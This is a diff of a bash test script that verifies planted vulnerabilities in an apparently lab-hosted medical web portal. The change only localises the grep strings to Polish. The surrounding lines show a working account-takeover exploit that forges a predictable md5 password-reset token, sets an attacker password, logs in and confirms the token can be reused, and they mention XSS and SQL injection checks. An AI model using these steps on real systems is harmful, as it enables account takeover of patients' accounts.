@@ -44,7 +44,7 @@ echo "$out" | grep -q '<script>alert(7)</script>' \
 echo "== #8 predictable, reusable password-reset token =="
 tok=$(md5h "${UID8}${SALT}")
 inv=$(curl -s "$BASE/reset.php?u=$UID8&token=$tok")
-echo "$inv" | grep -q 'Invalid reset link' && fail "reconstructed token rejected" \
+echo "$inv" | grep -q 'Nieprawidłowy link resetu' && fail "reconstructed token rejected" \
   || pass "token md5(uid.salt) reconstructed offline and accepted"
 curl -s -o /dev/null --data-urlencode "u=$UID8" --data-urlencode "token=$tok" --data-urlencode "password=Pwned123!" "$BASE/reset.php"
 TJ="$TMP/t.jar"; login "$TJ" "pacjent8@novamed.lab" "Pwned123!"
@@ -52,7 +52,7 @@ badge=$(curl -s -b "$TJ" "$BASE/dashboard.php" | grep -o 'badge-[a-z]*' | head -
 [ "$badge" = "badge-patient" ] && pass "account takeover: logged in with attacker-set password" || fail "takeover login failed ($badge)"
 curl -s -o /dev/null --data-urlencode "u=$UID8" --data-urlencode "token=$tok" --data-urlencode "password=Pwned456!" "$BASE/reset.php"
 inv2=$(curl -s "$BASE/reset.php?u=$UID8&token=$tok")
-echo "$inv2" | grep -q 'Invalid reset link' && fail "token consumed (not reusable)" || pass "token reusable (no expiry/consumption)"
+echo "$inv2" | grep -q 'Nieprawidłowy link resetu' && fail "token consumed (not reusable)" || pass "token reusable (no expiry/consumption)"
 sqlq "UPDATE users SET password_hash='$(md5h 'Patient890!')' WHERE id=$UID8;"  # restore
 
 echo "== #10 SQL injection in search.php (numeric concat) =="
